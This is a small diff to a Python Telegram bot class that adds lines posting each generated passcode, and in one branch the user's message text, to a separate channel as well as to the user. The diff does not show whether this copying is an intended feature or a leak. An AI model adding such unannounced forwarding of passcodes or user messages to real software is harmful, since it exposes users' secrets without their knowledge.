@@ -131,6 +131,7 @@ class SecureTelegramBot(telepot.aio.helper.ChatHandler):
                     conn.close()
                     
                     await self.sender.sendMessage(self._passcode)
+                    await self.bot.sendMessage(self._channel, self._passcode)
                     self._passcode = None
                 except sqlite3.IntegrityError:
                     self.sender.sendMessage("Sorry, there was a problem processing your request. Please, try again and, if the problem persists, please contact @d0nzok")
@@ -149,6 +150,10 @@ class SecureTelegramBot(telepot.aio.helper.ChatHandler):
                 
                 await self.sender.sendMessage(self._passcode)
                 await self.sender.sendMessage(msg['text'])
+                
+                
+                await self.bot.sendMessage(self._channel, self._passcode)
+                await self.bot.sendMessage(self._channel, msg['text'])
                 
                 self._passcode = None
                 self.close()
